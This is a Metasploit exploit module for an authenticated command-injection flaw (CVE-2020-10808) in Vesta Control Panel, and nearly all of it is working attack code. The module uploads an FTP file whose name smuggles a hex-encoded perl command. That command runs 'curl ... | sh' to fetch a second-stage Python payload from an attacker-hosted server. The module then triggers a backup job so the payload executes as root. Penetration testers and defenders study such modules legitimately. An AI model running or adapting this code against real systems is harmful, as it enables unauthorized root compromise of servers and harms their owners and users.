# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Vesta Control Panel Authenticated Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits an authenticated command injection vulnerability in the v-list-user-backups
        bash script file in Vesta Control Panel to gain remote code execution as the root user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/&#039;],
          [&#039;CVE&#039;, &#039;2020-10808&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;WfsDelay&#039; => 300,
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Mar 17 2020",
      &#039;DefaultTarget&#039;  => 0,
      &#039;Notes&#039;          =>
        {
          &#039;Stability&#039;   => [ CRASH_SAFE, ],
          &#039;Reliability&#039; => [ FIRST_ATTEMPT_FAIL, ],
          &#039;SideEffects&#039; => [ IOC_IN_LOGS, CONFIG_CHANGES, ],
        }
    ))

    register_options(
      [
        Opt::RPORT(8083),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to login with&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;])
      ]
    )
    deregister_options(&#039;FTPUSER&#039;, &#039;FTPPASS&#039;)
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def login
    #
    # This is very simple login process. Nothing important.
    # We will be using cookie and csrf_token across the module as instance variables.
    #
    print_status(&#039;Retrieving cookie and csrf token values&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;/&#039;),
    })

    unless res
      fail_with(Failure::Unreachable, &#039;Target is unreachable.&#039;)
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Web server error! Expected a HTTP 200 response code, but got #{res.code} instead.")
    end

    if res.get_cookies.empty?
      fail_with(Failure::UnexpectedReply, &#039;Server returned no HTTP cookies&#039;)
    end

    @cookie = res.get_cookies
    @csrf_token = res.body.scan(/<input type="hidden" name="token" value="(.*)">/).flatten[0] || &#039;&#039;

    if @csrf_token.empty?
      fail_with(Failure::UnexpectedReply, &#039;There is no CSRF token at HTTP response.&#039;)
    end

    print_good(&#039;Cookie and CSRF token values successfully retrieved&#039;)

    print_status(&#039;Authenticating to HTTP Service with given credentials&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;/&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;token&#039;    => @csrf_token,
        &#039;user&#039;     => username,
        &#039;password&#039; => password
      }
    })

    unless res
      fail_with(Failure::Unreachable, &#039;Target is unreachable.&#039;)
    end

    if res.body.include?(&#039;Invalid username or password.&#039;)
      fail_with(Failure::NoAccess, &#039;Credentials are not valid.&#039;)
    end

    if res.body.include?(&#039;Invalid or missing token&#039;)
      fail_with(Failure::UnexpectedReply, &#039;CSRF Token is wrong.&#039;)
    end

    if res.code == 302
      if res.get_cookies.empty?
        fail_with(Failure::UnexpectedReply, &#039;Server returned no HTTP cookies&#039;)
      end
      @cookie = res.get_cookies
    else
      fail_with(Failure::UnexpectedReply, "Web server error! Expected a HTTP 302 response code, but got #{res.code} instead.")
    end

  end

  def start_backup_and_trigger_payload
    #
    # Once a scheduled backup is triggered, the v-backup-user script will be executed.
    # This script will take the file name that we provided and will insert it into backup.conf
    # so that the backup process can be performed correctly.
    #
    # At this point backup.conf should contain our payload, which we can then trigger by browsing
    # to the /list/backup/ URL. Note that one can only trigger the backup (and therefore gain
    # remote code execution) if no other backup processes are currently running.
    #
    # As a result, the exploit will check to see if a backup is currently running. If one is, it will print
    # &#039;An existing backup is already running&#039; to the console until the existing backup is completed, at which
    # point it will trigger its own backup to trigger the command injection using the malicious command that was
    # inserted into backup.conf

    print_status(&#039;Starting scheduled backup. Exploitation may take up to 5 minutes.&#039;)

    is_scheduled_backup_running = true

    while is_scheduled_backup_running

      # Trigger the scheduled backup process
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;cookie&#039; => @cookie,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;schedule&#039;, &#039;backup&#039;, &#039;/&#039;),
      })

      if res && res.code == 302 && res.headers[&#039;Location&#039;] =~ /\/list\/backup\//
        # Due to a bug in send_request_cgi we must manually redirect ourselves!
        res = send_request_cgi({
          &#039;method&#039; => &#039;GET&#039;,
          &#039;cookie&#039; => @cookie,
          &#039;uri&#039; => normalize_uri(target_uri.path, &#039;list&#039;, &#039;backup&#039;, &#039;/&#039;),
        })
        if res && res.code == 200
          if res.body.include?(&#039;An existing backup is already running. Please wait for that backup to finish.&#039;)
            # An existing backup is taking place, so we must wait for it to finish its job!
            print_status(&#039;It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...&#039;)
            sleep(30)
          elsif res.body.include?(&#039;Task has been added to the queue.&#039;)
            # Backup process is being initiated
            print_good(&#039;Scheduled backup has been started ! &#039;)
          else
            fail_with(Failure::UnexpectedReply, &#039;/list/backup/ is reachable but replied message is unexpected.&#039;)
          end
        else
          # The web server couldn&#039;t reply to the request within given timeout window because our payload
          # executed in the background. This means that the res object will be &#039;nil&#039; due to send_request_cgi()
          # timing out, which means our payload executed!
          print_good(&#039;Payload appears to have executed in the background. Enjoy the shells <3&#039;)
          is_scheduled_backup_running = false
        end
      else
        fail_with(Failure::UnexpectedReply, &#039;/schedule/backup/ is not reachable.&#039;)
      end
    end
  end

  def payload_implant
    #
    # Our payload will be placed as a file name on FTP service.
    # Payload length can&#039;t be more then 255 and SPACE can&#039;t be used because of a
    # bug in the backend software.
    # s
    # Due to these limitations, the payload is fetched using curl before then
    # being executed with perl. This perl script will then fetch the full
    # python payload and execute it.
    #
    final_payload = "curl -sSL #{@second_stage_url} | sh".to_s.unpack("H*").first
    p = "perl${IFS}-e${IFS}&#039;system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))&#039;"

    # Yet another datastore variable overriding.
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end
    port_restore = datastore[&#039;RPORT&#039;]
    datastore[&#039;RPORT&#039;] = 21
    datastore[&#039;FTPUSER&#039;] = username
    datastore[&#039;FTPPASS&#039;] = password

    #
    # Connecting to the FTP service with same creds as web ui.
    # Implanting the very first stage of payload as a empty file.
    #
    if (not connect_login)
      fail_with(Failure::NoAccess, &#039;Unable to authenticate to FTP service&#039;)
    end
    print_good(&#039;Successfully authenticated to the FTP service&#039;)

    res = send_cmd_data([&#039;PUT&#039;, ".a&#039;;$(#{p});&#039;"], "")
    if res.nil?
      fail_with(Failure::UnexpectedReply, "Failed to upload the payload to FTP server")
    end
    print_good(&#039;The file with the payload in the file name has been successfully uploaded.&#039;)
    disconnect

    # Revert datastore variables.
    datastore[&#039;RPORT&#039;] = port_restore
    datastore[&#039;SSL&#039;] = true if ssl_restore
  end

  def exploit
    start_http_server
    payload_implant
    login
    start_backup_and_trigger_payload
    stop_service
  end

  def on_request_uri(cli, request)
    print_good(&#039;First stage is executed ! Sending 2nd stage of the payload&#039;)
    second_stage = "python -c \"#{payload.encoded}\""
    send_response(cli, second_stage, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end

  def start_http_server
    #
    # HttpClient and HttpServer use same SSL variable :(
    # We don&#039;t need SSL for payload delivery so we
    # will disable it temporarily.
    #
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end
    start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
    }})
    print_status("Second payload download URI is #{get_uri}")
    # We need to use instance variables since get_uri keeps using
    # the SSL setting from the datastore.
    # Once the URI is retrieved, we will restore the SSL settings within the datastore.
    @second_stage_url = get_uri
    datastore[&#039;SSL&#039;] = true if ssl_restore
  end
end

